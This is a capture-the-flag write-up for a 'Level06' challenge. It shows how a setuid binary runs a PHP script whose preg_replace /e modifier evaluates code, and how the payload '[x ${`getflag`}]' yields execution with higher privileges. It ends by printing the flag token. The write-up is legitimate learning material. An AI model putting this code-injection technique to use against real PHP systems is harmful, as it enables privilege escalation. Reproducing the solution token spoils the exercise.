# Level06

## Solution

We have an executable file and a PHP script.

```
$ ls -l
total 12
-rwsr-x---+ 1 flag06 level06 7503 Aug 30  2015 level06
-rwxr-x---  1 flag06 level06  356 Mar  5  2016 level06.php
```

What is noteworthy about .php is that it reads the contents of a file and, if it contains a regex that works with ``/(\[x (.*)\])``, it executes it with /e, the PHP eval command that allows code to be executed.

```
$ cat level06.php
#!/usr/bin/php
<?php
function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
$r = x($argv[1], $argv[2]); print $r;
?>
```

We can see that the executable contains the following functions that allow commands to be executed with additional permissions.

```
$ strings level06
...
setresgid
setresuid
execve
getegid
geteuid
...
```

Thanks to this site, we can get an idea of the code contained in the executable file.
</br>
<<https://dogbolt.org/>>

```
$ scp -P 4242 level06@0.0.0.0:/home/user/level06/level06 .
```

```
v0 = getegid();
v11 = geteuid();
setresgid(v0, v0, v0, v11);
setresuid(v11, v11, v11);
v3 = v9;
v4 = v10;
v1 = "/usr/bin/php";
v2 = "/home/user/level06/level06.php";
v5 = 0;
execve("/usr/bin/php", &v1, a2);
```

It is therefore understandable that if we find a string matching the .php that contains commands, we can execute them with permissions higher than our own.
</br>
The matching string is ``[x ${`getflag`}]``.

```
$ echo '[x ${`getflag`}]' > /tmp/test
```

All you have to do is put it in a file and run the program with.

```
$ ./level06 /tmp/test
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
```
